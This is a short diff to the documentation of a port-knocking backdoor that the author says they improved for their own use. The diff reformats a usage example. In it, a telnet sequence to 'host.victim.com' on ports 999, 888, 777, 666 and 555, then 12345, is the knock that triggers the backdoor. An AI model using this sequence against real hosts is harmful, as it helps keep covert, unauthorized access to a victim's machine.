@@ -20,12 +20,10 @@ I’ve decided to improve a bit the backdoor for my self usage.  Because I’m a
 #2. Example of usage 
 
 sh:
-
-\# t="telnet host.victim.com"
-
-
-\# $t 999; $t 888; $t 777 ; $t 666; $t 555; $t 12345 ; sleep 1 ; $t 12345
-
+```sh
+# t="telnet host.victim.com"
+# $t 999; $t 888; $t 777 ; $t 666; $t 555; $t 12345 ; sleep 1 ; $t 12345
+```
 
 
 In "999 888 777 666 555": The knocking SYN phase. We will send SYN packets on port 999, 888, 777, 666 and 555
